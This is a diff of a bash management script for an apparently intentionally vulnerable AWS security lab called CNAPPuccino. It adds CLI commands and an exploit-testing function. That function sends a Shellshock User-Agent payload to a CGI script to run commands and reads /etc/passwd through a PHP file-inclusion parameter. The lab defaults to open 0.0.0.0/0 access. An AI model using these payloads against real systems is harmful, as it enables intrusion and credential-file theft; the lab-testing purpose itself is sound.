@@ -364,47 +364,7 @@ terraform_init() {
   echo "${GREEN}Init complete.${RESET}"
 }
 
-validate_s3_deployment() {
-  local bucket_name="cnappuccino-bootstrap"
-  local validation_failed=0
-  
-  # Check if bucket exists
-  if ! aws --profile "$AWS_PROFILE" s3 ls "s3://$bucket_name" >/dev/null 2>&1; then
-    echo "   ❌ S3 bucket '$bucket_name' not accessible"
-    return 1
-  fi
-  
-  # Check critical assets exist in S3
-  local critical_s3_assets=(
-    "user_data.sh"
-    "assets/scripts/exec.cgi"
-    "assets/configs/apache-vhost.conf" 
-    "assets/configs/cgi-enabled.conf"
-  )
-  
-  for asset in "${critical_s3_assets[@]}"; do
-    if ! aws --profile "$AWS_PROFILE" s3api head-object --bucket "$bucket_name" --key "$asset" >/dev/null 2>&1; then
-      echo "   ❌ Missing S3 asset: $asset"
-      ((validation_failed++))
-    else
-      echo "   ✅ S3 asset present: $asset"
-    fi
-  done
-  
-  # Validate cgi-enabled.conf content (ensure no duplicate SetHandler)
-  local temp_file="/tmp/cgi-validation.conf"
-  if aws --profile "$AWS_PROFILE" s3 cp "s3://$bucket_name/assets/configs/cgi-enabled.conf" "$temp_file" 2>/dev/null; then
-    if grep -q "SetHandler cgi-script" "$temp_file"; then
-      echo "   ❌ cgi-enabled.conf contains duplicate SetHandler (known issue)"
-      ((validation_failed++))
-    else
-      echo "   ✅ cgi-enabled.conf format correct"
-    fi
-    rm -f "$temp_file"
-  fi
-  
-  return $validation_failed
-}
+# Legacy S3 validation function removed - now using GitHub raw URLs
 
 terraform_apply() {
    headline "Provision Infrastructure" "Creating your CNAPPuccino lab environment"
@@ -453,13 +413,8 @@ terraform_apply() {
    
    echo "${GREEN}✅ Terraform deployment completed${RESET}"
    
-   # Validate S3 bucket and assets after deployment
-   echo "${YELLOW}🔍 Validating S3 bucket state...${RESET}"
-   if validate_s3_deployment; then
-     echo "${GREEN}✅ S3 bucket validation passed${RESET}"
-   else
-     echo "${YELLOW}⚠️  S3 validation issues detected - deployment may still work via fallback${RESET}"
-   fi
+   # GitHub-based asset management - no S3 validation needed
+   echo "${GREEN}✅ Asset management: GitHub raw URLs${RESET}"
 
    local ip ssh_cmd instance_id
    ip=$(terraform_output_raw public_ip)
@@ -866,22 +821,8 @@ terraform_nuke() {
     done
   fi
   
-  # Step 12: Delete S3 buckets
-  echo "12/13 Deleting S3 buckets..."
-  local s3_buckets
-  s3_buckets=$(aws --profile "$AWS_PROFILE" s3api list-buckets --query "Buckets[?contains(Name, 'cnappuccino')].Name" --output text 2>/dev/null || echo "")
-  if [[ -n "$s3_buckets" && "$s3_buckets" != "None" ]]; then
-    for bucket in $s3_buckets; do
-      echo "   Emptying and deleting bucket: $bucket"
-      # Empty bucket first (required before deletion)
-      aws --profile "$AWS_PROFILE" s3 rm "s3://$bucket" --recursive 2>/dev/null || true
-      # Delete bucket
-      retry_aws_operation "aws --profile '$AWS_PROFILE' s3api delete-bucket --bucket '$bucket'" "delete S3 bucket $bucket"
-    done
-  fi
-  
-  # Step 13: Delete key pairs and IAM resources
-  echo "13/13 Deleting key pairs and IAM resources..."
+  # Step 12: Delete key pairs and IAM resources  
+  echo "12/12 Deleting key pairs and IAM resources..."
   aws --profile "$AWS_PROFILE" ec2 delete-key-pair --key-name cnappuccino-kp >/dev/null 2>&1 || true
   aws --profile "$AWS_PROFILE" iam remove-role-from-instance-profile --instance-profile-name cnappuccino_lab_instance_profile --role-name cnappuccino_lab_instance_role >/dev/null 2>&1 || true
   aws --profile "$AWS_PROFILE" iam delete-instance-profile --instance-profile-name cnappuccino_lab_instance_profile >/dev/null 2>&1 || true
@@ -1692,6 +1633,234 @@ configure_lab_settings() {
 }
 
 # -----------------------------
-# Entry
+# Command Line Interface
 # -----------------------------
-while true; do main_menu; done
+
+usage() {
+    cat << EOF
+Usage: $0 [OPTIONS] [COMMAND]
+
+OPTIONS:
+    --owner OWNER          Set owner tag (default: barista)
+    --region REGION        Set AWS region (default: us-east-1)  
+    --instance-type TYPE   Set instance type (default: t3.medium)
+    --cidr CIDR           Set allowed CIDR (default: 0.0.0.0/0)
+    --profile PROFILE     Set AWS profile (default: default)
+    --help, -h            Show this help
+
+COMMANDS:
+    deploy                 Quick deploy with current/default settings
+    test                   Test deployed environment exploits
+    status                 Show deployment status
+    cleanup                Clean up all resources
+    menu                   Show interactive menu (default)
+
+EXAMPLES:
+    $0 --owner john deploy                    # Quick deploy with owner=john
+    $0 --region us-west-2 --owner test deploy # Deploy in us-west-2
+    $0 test                                   # Test exploits on existing deployment
+    $0 cleanup                                # Clean up everything
+
+EOF
+}
+
+# Parse command line arguments
+parse_arguments() {
+    while [[ $# -gt 0 ]]; do
+        case $1 in
+            --owner)
+                export OWNER="$2"
+                shift 2
+                ;;
+            --region)
+                export REGION="$2"
+                shift 2
+                ;;
+            --instance-type)
+                export INSTANCE_TYPE="$2"
+                shift 2
+                ;;
+            --cidr)
+                export ALLOWED_CIDR="$2"
+                shift 2
+                ;;
+            --profile)
+                export AWS_PROFILE="$2"
+                shift 2
+                ;;
+            --help|-h)
+                usage
+                exit 0
+                ;;
+            deploy)
+                COMMAND="deploy"
+                shift
+                ;;
+            test)
+                COMMAND="test"
+                shift
+                ;;
+            status)
+                COMMAND="status"
+                shift
+                ;;
+            cleanup)
+                COMMAND="cleanup"
+                shift
+                ;;
+            menu)
+                COMMAND="menu"
+                shift
+                ;;
+            *)
+                echo "Unknown option: $1"
+                usage
+                exit 1
+                ;;
+        esac
+    done
+}
+
+# Execute command line operations
+execute_command() {
+    local command="${1:-menu}"
+    
+    case "$command" in
+        deploy)
+            load_lab_configuration
+            echo "${GREEN}🚀 Starting quick deployment with settings:${RESET}"
+            echo "   Owner: $OWNER"
+            echo "   Region: $REGION"
+            echo "   Instance Type: $INSTANCE_TYPE"
+            echo "   Allowed CIDR: $ALLOWED_CIDR"
+            echo ""
+            
+            # Run the same steps as menu option 2
+            check_deps && terraform_init && terraform_apply
+            echo ""
+            echo "${GREEN}✅ Quick deployment complete!${RESET}"
+            echo "Use: $0 test    # to test exploits"
+            echo "Use: $0 status  # to check status"
+            ;;
+        test)
+            # Run the exploit testing
+            test_exploits_quick
+            ;;
+        status)
+            load_lab_configuration
+            show_deployment_status
+            ;;
+        cleanup)
+            load_lab_configuration
+            echo "${YELLOW}🧹 Starting cleanup...${RESET}"
+            terraform_destroy
+            ;;
+        menu)
+            # Start interactive menu
+            while true; do main_menu; done
+            ;;
+        *)
+            echo "Unknown command: $command"
+            usage
+            exit 1
+            ;;
+    esac
+}
+
+# Quick exploit testing function
+test_exploits_quick() {
+    load_lab_configuration
+    
+    echo "${CYAN}🔍 Quick Exploit Testing${RESET}"
+    echo ""
+    
+    # Get instance IP
+    local ip=$(get_instance_ip)
+    if [[ -z "$ip" ]]; then
+        echo "${RED}❌ No deployed instance found. Deploy first with: $0 deploy${RESET}"
+        exit 1
+    fi
+    
+    echo "${GREEN}Target: $ip${RESET}"
+    echo ""
+    
+    # Test 1: Basic RCE via CGI
+    echo "🔥 Test 1: CGI Command Injection"
+    local rce_result=$(curl -s -H "User-Agent: () { :; }; echo 'RCE_SUCCESS' && whoami" "http://$ip/cgi-bin/exec.cgi" | head -1 || echo "FAILED")
+    if [[ "$rce_result" == *"RCE_SUCCESS"* ]]; then
+        echo "   ✅ CGI RCE: Working ($rce_result)"
+    else
+        echo "   ❌ CGI RCE: Failed"
+    fi
+    
+    # Test 2: Web service availability  
+    echo "🌐 Test 2: Web Services"
+    local apache_status=$(curl -s -o /dev/null -w "%{http_code}" "http://$ip/" || echo "000")
+    local nginx_status=$(curl -s -o /dev/null -w "%{http_code}" "http://$ip:8080/" || echo "000") 
+    
+    echo "   Apache (port 80): $([ "$apache_status" = "200" ] && echo "✅ Working" || echo "❌ Failed ($apache_status)")"
+    echo "   Nginx (port 8080): $([ "$nginx_status" = "200" ] && echo "✅ Working" || echo "❌ Failed ($nginx_status)")"
+    
+    # Test 3: PHP LFI
+    echo "🗂️  Test 3: PHP Local File Inclusion"
+    local lfi_result=$(curl -s "http://$ip/view.php?file=/etc/passwd" | head -1 || echo "")
+    if [[ "$lfi_result" == *"root:"* ]]; then
+        echo "   ✅ LFI: Working (retrieved /etc/passwd)"
+    else
+        echo "   ❌ LFI: Failed"
+    fi
+    
+    echo ""
+    echo "${CYAN}📋 Full Test Commands:${RESET}"
+    echo "RCE Test:"
+    echo "  curl -H \"User-Agent: () { :; }; whoami\" http://$ip/cgi-bin/exec.cgi"
+    echo ""
+    echo "LFI Test:" 
+    echo "  curl \"http://$ip/view.php?file=/etc/passwd\""
+    echo ""
+    echo "Directory Listing:"
+    echo "  curl http://$ip:8080/secret/"
+    echo ""
+}
+
+# Get deployed instance IP helper
+get_instance_ip() {
+    if [[ -f "$STATE_DIR/terraform_output.json" ]]; then
+        jq -r '.public_ip.value // empty' "$STATE_DIR/terraform_output.json" 2>/dev/null || echo ""
+    else
+        cd "$TF_DIR" && terraform output -json public_ip 2>/dev/null | jq -r '.' 2>/dev/null || echo ""
+    fi
+}
+
+# Show deployment status
+show_deployment_status() {
+    local ip=$(get_instance_ip)
+    if [[ -n "$ip" ]]; then
+        echo "${GREEN}✅ Lab Active${RESET} - IP: $ip"
+        echo ""
+        echo "Vulnerable Endpoints:"
+        echo "  • CGI RCE: http://$ip/cgi-bin/exec.cgi"
+        echo "  • PHP LFI: http://$ip/view.php?file=/etc/passwd"
+        echo "  • Directory Listing: http://$ip:8080/secret/"
+        echo "  • File Upload: http://$ip/upload.php"
+        echo ""
+        echo "Quick Test: $0 test"
+    else
+        echo "${YELLOW}⚠️ No active deployment found${RESET}"
+        echo "Deploy with: $0 deploy"
+    fi
+}
+
+# -----------------------------
+# Entry Point
+# -----------------------------
+
+# Parse command line arguments
+COMMAND="menu"  # default
+parse_arguments "$@"
+
+# Load configuration
+load_lab_configuration
+
+# Execute the command
+execute_command "$COMMAND"
